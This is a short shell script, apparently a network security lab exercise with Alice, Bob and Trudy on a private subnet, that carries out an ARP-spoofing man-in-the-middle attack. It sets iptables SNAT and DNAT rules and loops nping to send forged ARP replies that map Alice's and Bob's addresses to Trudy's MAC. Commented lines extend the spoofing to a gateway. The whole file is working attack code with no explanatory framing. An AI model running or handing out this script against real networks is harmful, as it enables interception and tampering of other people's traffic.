# Define target IP and MAC addresses
trudy_mac="00:16:3e:3d:17:94"
alice_ip="172.31.0.2"
bob_ip="172.31.0.3"
trudy_ip="172.31.0.4"

iptables -t nat -A POSTROUTING --destination $bob_ip -j SNAT --to-source $alice_ip
iptables -t nat -A POSTROUTING --destination $alice_ip -j SNAT --to-source $bob_ip
iptables -t nat -A PREROUTING -j DNAT --to-destination $trudy_ip
while :
do

# Construct the command to send ARP packet
nping --dest-ip $alice_ip --arp --arp-type arp-reply --source-ip $alice_ip --source-mac $trudy_mac -c 1
# echo $alice_target_mac
# nping --arp --arp-type arp --arp-sender-mac $alice_target_mac --arp-target-mac "ff:ff:ff:ff:ff:ff" --arp-sender-ip $alice_target_ip --arp-target-ip $alice_target_ip -c 1

# Construct the command to send ARP packet
nping --dest-ip $bob_ip --arp --arp-type arp-reply --source-ip $bob_ip --source-mac $trudy_mac -c 1
sleep 0.3
done
# Define target IP and MAC addresses

# out_target_ip="172.31.0.1"
# out_target_mac="00:16:3e:3d:17:94"

# nping --dest-ip $out_target_ip --arp --arp-type arp-reply --source-ip $out_target_ip --source-mac $out_target_mac -c 1